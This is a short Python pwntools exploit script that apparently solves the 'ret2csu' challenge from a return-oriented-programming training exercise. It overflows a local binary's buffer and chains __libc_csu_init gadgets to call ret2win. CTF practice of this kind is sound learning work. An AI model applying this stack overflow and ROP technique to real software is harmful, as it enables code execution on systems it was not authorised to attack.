#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break at the end of pwnme
gs='''
b *pwnme+150
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('ret2csu')
context.binary=elf
# context(terminal=['tmux'])

# Offset to the return adress
offset=0x28

ret2win=elf.plt['ret2win']

g_poprdi=0x004006a3
# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget_1=0x0040069a
gadget_2=0x00400680


io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

'''
[0x601018] pwnme  →  0x7ffff7dc793a
[0x601020] ret2win  →  0x400516

The target is :
0x400510 <ret2win@plt>

We need an address containing 0x400510
'''

PL =b"A"*offset
PL+=p64(gadget_1)
PL+=p64(0x0)                 # rbx
PL+=p64(ret2win//8)          # rbp
PL+=p64(0x0600e48)           # r12
PL+=p64(0xdeadbeefdeadbeef)  # r13
PL+=p64(0xcafebabecafebabe)  # r14
PL+=p64(0xd00df00dd00df00d)  # r15
PL+=p64(gadget_2)

io.sendline(PL)
io.interactive()

